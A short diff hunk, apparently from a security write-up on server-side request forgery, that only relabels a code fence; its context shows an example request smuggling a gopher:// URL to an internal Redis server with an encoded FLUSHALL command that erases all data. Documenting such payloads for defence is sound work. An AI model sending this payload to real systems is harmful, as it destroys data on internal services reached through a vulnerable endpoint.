@@ -56,7 +56,7 @@ def fetch_preview():
 
 ### Protocol smuggling via gopher://
 
-```
+```text
 # gopher:// allows arbitrary TCP payloads — can send Redis commands, SMTP, etc.
 GET /fetch?url=gopher://internal-redis:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A
 ```
